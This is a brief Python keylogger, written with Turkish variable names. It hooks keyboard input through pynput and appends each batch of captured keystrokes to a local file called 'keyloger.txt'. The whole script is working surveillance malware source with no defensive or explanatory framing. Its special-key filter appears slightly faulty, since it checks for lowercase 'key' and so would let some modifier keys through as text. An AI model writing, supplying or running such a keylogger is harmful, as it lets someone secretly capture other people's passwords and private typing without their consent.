from pynput.keyboard import Listener

basılanTuşSayısı = 0

basılanTuşlarınListesi = []

def tuşaBasış(basılanTuş):
    global basılanTuşSayısı,basılanTuşlarınListesi
    basılanTuşSayısı += 1
    basılanTuşlarınListesi.append(basılanTuş)

    if basılanTuşSayısı > 20:
        basılanTuşSayısı = 0
        basılanTuşlarıDosyayaAktar(basılanTuşlarınListesi)
        basılanTuşlarınListesi.clear()

def basılanTuşlarıDosyayaAktar(basılanTuşlarınListesi):
    with open("keyloger.txt", "a", encoding="utf-8") as dosya:
        for basılanTuş in basılanTuşlarınListesi:
            x =str(basılanTuş).replace("'","")
            if x.find("space") > 0:
                dosya.write("\n")
            elif x.find("key") == -1:
                dosya.write(x)

with Listener(on_press = tuşaBasış) as Listener:
    Listener.join()